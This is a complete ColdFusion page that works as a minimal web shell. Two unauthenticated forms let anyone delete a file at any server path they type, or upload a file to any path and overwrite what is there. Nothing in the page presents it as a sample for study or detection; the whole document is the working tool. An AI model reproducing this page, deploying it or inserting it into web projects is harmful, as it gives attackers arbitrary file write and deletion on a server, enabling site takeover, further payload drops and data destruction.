<CFPARAM NAME="Form.Action" DEFAULT="ShowPost">
<CFSWITCH EXPRESSION=#Form.Action#>

<CFCASE VALUE="delete">
<CFFILE ACTION="Delete" FILE="#Form.path#">
Delete Success
</CFCASE>
<CFCASE VALUE="upload">
<CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">
Upload Success
</CFCASE>
<CFDEFAULTCASE>
<FORM ACTION="" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
To: <INPUT NAME="path" value="Path" size=72><br>
local files: <INPUT NAME="FileContents" TYPE="file" size=50>
<input type=hidden name="action" value="upload">
<INPUT TYPE="submit" VALUE="upload">
</FORM>
<form action="" target="_blank" method=post>
<input name="path" value="Path" size=72>
<input type=submit value="Del">
<input type=hidden name="action" value="delete">
</form>
</CFDEFAULTCASE>
</CFSWITCH>
